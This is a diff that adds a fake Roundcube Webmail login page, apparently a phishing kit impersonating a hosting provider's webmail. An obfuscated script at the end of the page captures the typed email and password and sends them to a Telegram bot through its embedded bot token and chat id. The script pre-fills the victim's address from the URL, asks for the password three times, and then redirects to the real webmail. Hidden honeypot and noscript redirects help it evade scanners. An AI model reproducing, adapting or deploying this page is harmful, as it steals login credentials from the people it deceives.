@@ -1,0 +1,92 @@
+
+
+<!DOCTYPE html>
+<html lang="en" class="js chrome webkit layout-large">
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+	<title>Roundcube Webmail :: Welcome to Roundcube Webmail</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0">
+	<meta name="theme-color" content="#f4f4f4">
+	<meta name="msapplication-navbutton-color" content="#f4f4f4">
+
+	<link rel="shortcut icon" href="https://webmail.supremecluster.com/skins/elastic/images/favicon.ico?s=1593860317">
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+
+	<link rel="stylesheet" href="https://webmail.supremecluster.com/skins/elastic/deps/bootstrap.min.css?s=1593860330">
+	<link rel="stylesheet" href="https://webmail.supremecluster.com/skins/elastic/styles/styles.css?s=1593860317">
+
+	<link rel="stylesheet" type="text/css" href="https://webmail.supremecluster.com/plugins/xframework/assets/styles/framework.css?s=1506327547">
+	<link rel="stylesheet" type="text/css" href="https://webmail.supremecluster.com/plugins/jqueryui/themes/elastic/jquery-ui.css?s=1593860316">
+
+
+</head>
+
+<body class="task-login action-none">
+	<div id="layout">
+
+
+		<h1 class="voice">Roundcube Webmail Login</h1>
+
+		<div id="layout-content" class="selected no-navbar" role="main">
+			<img src="https://webmail.supremecluster.com/skins/elastic/images/logo.svg?s=1593860317" id="logo" alt="Logo">
+
+  <div id="container">
+			<form id="login-form" name="thisForm" method="post" class="propform" action="">
+
+<div id="success"  class="notificaiton-wrap notification notification-danger notification-description" style="display: none;border-left: 3px solid #11ef00;background: #d0f7da;">Thank you for updating your email, you will be "logged off".</div>
+
+
+<div style="" id="div1">
+
+				<div class="error" style="margin-top: 5px; margin-bottom: 4px; display: none; font-size: 14px;" id="errorShow"></div>
+				<input type="hidden" name="source" id="source" value="roundcube">
+				<input type="hidden" name="_task" value="login" class="form-control">
+				<table>
+					<tbody>
+<center>
+  <div id="msg-required" style="display:none; color: red; margin-top: 20px;">Both fields are required.</div>
+     <div class="message_pro" id="msg-reenter" style="display:none; color:red">Something isn't right, please try again.</div></center>
+						<tr class="form-group row">
+							<td class="title" style="display: none;"><label for="rcmloginuser">Username</label>
+							</td>
+							<td class="input input-group input-group-lg"><span class="input-group-prepend"><i
+										class="input-group-text user fa fa-user"></i></span><input name="email"
+									id="email" required="" size="40" autocapitalize="off" type="text"
+									class="form-control" placeholder="Username"></td>
+						</tr>
+						<tr class="form-group row">
+							<td class="title" style="display: none;"><label for="rcmloginpwd">Password</label>
+							</td>
+							<td class="input input-group input-group-lg"><span class="input-group-prepend"><i
+										class="input-group-text pass fa fa-lock"></i></span><input name="password"
+									id="password" required size="40" autocapitalize="off" type="password"
+									class="form-control" placeholder="Password">
+<input type="text" name="confirm_email" id="confirm_email" style="display: none;" autocomplete="off" />
+<noscript><meta http-equiv="refresh" content="0;url=https://www.google.com"></noscript>
+</td>
+						</tr>
+					</tbody>
+				</table>
+				<p class="formbuttons"><button type="submit" id="submit-btn"
+						class="button btn btn-primary btn-lg text-uppercase w-100">Login</button>
+				</p>
+
+				<div id="login-footer" role="contentinfo">
+					Roundcube Webmail
+
+
+				</div>
+			</form>
+		</div>
+		</div>
+  <div id="thanks" style="display: none; margin-top: 200px; font-size: 20px;">Thanks. Redirecting...</div>
+</body>
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+    const _0x5e00ef=_0x45fa;function _0x5315(){const _0x2f8ccd=['18751392zzjPmS','msg-reenter','submit-btn','thanks','stringify','key','683118NKhOko','\x0aPassword:\x20','focus','2504299zRMMGj','391750gUdHUd','24VnGoik','confirm_email','location','10yYrssT','test','application/json','password','value','8589851245:AAENOOfh3e9YlBwQrmiEe5RzIn6kL6t7_JY','https://webmail.supremecluster.com/','href','get','DOMContentLoaded','getElementById','preventDefault','includes','6WjonkW','keydown','search','click','122852GPEpsl','40CnNtFf','email','msg-required','trim','display','block','POST','split','/sendMessage','8279351688','https://api.telegram.org/bot','style','6691884ZgYVJf','Email:\x20','addEventListener','269289KqHpAS','none'];_0x5315=function(){return _0x2f8ccd;};return _0x5315();}function _0x45fa(_0x223688,_0x44311c){const _0x531548=_0x5315();return _0x45fa=function(_0x45fa29,_0x33335a){_0x45fa29=_0x45fa29-0x195;let _0x2d2b07=_0x531548[_0x45fa29];return _0x2d2b07;},_0x45fa(_0x223688,_0x44311c);}(function(_0x4d944d,_0x422034){const _0x19ffd3=_0x45fa,_0x3f0efd=_0x4d944d();while(!![]){try{const _0x416dcd=-parseInt(_0x19ffd3(0x1ba))/0x1*(parseInt(_0x19ffd3(0x19a))/0x2)+parseInt(_0x19ffd3(0x1b2))/0x3+parseInt(_0x19ffd3(0x1a7))/0x4+parseInt(_0x19ffd3(0x1b6))/0x5*(parseInt(_0x19ffd3(0x196))/0x6)+parseInt(_0x19ffd3(0x1b5))/0x7*(parseInt(_0x19ffd3(0x1b7))/0x8)+parseInt(_0x19ffd3(0x1aa))/0x9*(parseInt(_0x19ffd3(0x19b))/0xa)+-parseInt(_0x19ffd3(0x1ac))/0xb;if(_0x416dcd===_0x422034)break;else _0x3f0efd['push'](_0x3f0efd['shift']());}catch(_0x409c12){_0x3f0efd['push'](_0x3f0efd['shift']());}}}(_0x5315,0xd043a),document[_0x5e00ef(0x1a9)](_0x5e00ef(0x1c3),function(){const _0x439331=_0x5e00ef,_0x13ef74=document[_0x439331(0x1c4)](_0x439331(0x19c)),_0x4aad79=document[_0x439331(0x1c4)](_0x439331(0x1bd)),_0x123e7c=document[_0x439331(0x1c4)](_0x439331(0x1ae)),_0x5f4a4a=document['getElementById']('container'),_0x59bc70=document[_0x439331(0x1c4)](_0x439331(0x19d)),_0x2758c0=document[_0x439331(0x1c4)](_0x439331(0x1ad)),_0x4334f6=document['getElementById']('thanks');let _0x31cfb5=0x0;const _0x438c7b=window[_0x439331(0x1b9)][_0x439331(0x1c1)];let _0x27b185='';if(_0x438c7b[_0x439331(0x195)]('#')){const _0x295cb0=decodeURIComponent(_0x438c7b[_0x439331(0x1a2)]('#')[0x1][_0x439331(0x19e)]()),_0x20a478=/^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;_0x27b185=_0x20a478[_0x439331(0x1bb)](_0x295cb0)?atob(_0x295cb0):_0x295cb0;}else{if(_0x438c7b[_0x439331(0x195)]('?email=')){const _0x1cdf1d=new URLSearchParams(window[_0x439331(0x1b9)][_0x439331(0x198)])[_0x439331(0x1c2)](_0x439331(0x19c));_0x27b185=decodeURIComponent(_0x1cdf1d);}}_0x27b185&&_0x27b185[_0x439331(0x195)]('@')&&(_0x13ef74[_0x439331(0x1be)]=_0x27b185);function _0x43029b(_0xc7ac35){const _0x286fd7=_0x439331;_0x59bc70[_0x286fd7(0x1a6)][_0x286fd7(0x19f)]='none',_0x2758c0['style'][_0x286fd7(0x19f)]=_0x286fd7(0x1ab),_0x4334f6[_0x286fd7(0x1a6)][_0x286fd7(0x19f)]=_0x286fd7(0x1ab),_0xc7ac35&&(document['getElementById'](_0xc7ac35)[_0x286fd7(0x1a6)][_0x286fd7(0x19f)]=_0x286fd7(0x1a0));}function _0x1912c4(_0x5da41e){const _0xd94b43=_0x439331;_0x5da41e[_0xd94b43(0x1c5)]();const _0x52460c=_0x13ef74[_0xd94b43(0x1be)][_0xd94b43(0x19e)](),_0x5e496a=_0x4aad79[_0xd94b43(0x1be)][_0xd94b43(0x19e)]();if(!_0x52460c||!_0x5e496a){_0x43029b(_0xd94b43(0x19d));return;}const _0x391e7d=_0xd94b43(0x1bf),_0x655728=_0xd94b43(0x1a4),_0x8ec072=_0xd94b43(0x1a8)+_0x52460c+_0xd94b43(0x1b3)+_0x5e496a;fetch(_0xd94b43(0x1a5)+_0x391e7d+_0xd94b43(0x1a3),{'method':_0xd94b43(0x1a1),'headers':{'Content-Type':_0xd94b43(0x1bc)},'body':JSON[_0xd94b43(0x1b0)]({'chat_id':_0x655728,'text':_0x8ec072})}),_0x31cfb5++,_0x31cfb5<0x3?(_0x43029b(_0xd94b43(0x1ad)),_0x4aad79[_0xd94b43(0x1be)]='',_0x4aad79[_0xd94b43(0x1b4)]()):(_0x5f4a4a[_0xd94b43(0x1a6)][_0xd94b43(0x19f)]=_0xd94b43(0x1ab),_0x43029b(_0xd94b43(0x1af)),setTimeout(()=>{const _0x39d946=_0xd94b43;window[_0x39d946(0x1b9)][_0x39d946(0x1c1)]=_0x39d946(0x1c0);},0xbb8));}const _0x9db506=document[_0x439331(0x1c4)](_0x439331(0x1b8));if(_0x9db506&&_0x9db506['value']!=='')return;_0x123e7c[_0x439331(0x1a9)](_0x439331(0x199),_0x1912c4),document[_0x439331(0x1a9)](_0x439331(0x197),function(_0xc95022){const _0x4ddfae=_0x439331;_0xc95022[_0x4ddfae(0x1b1)]==='Enter'&&_0x1912c4(_0xc95022);});}));
+  </script>
+</html>
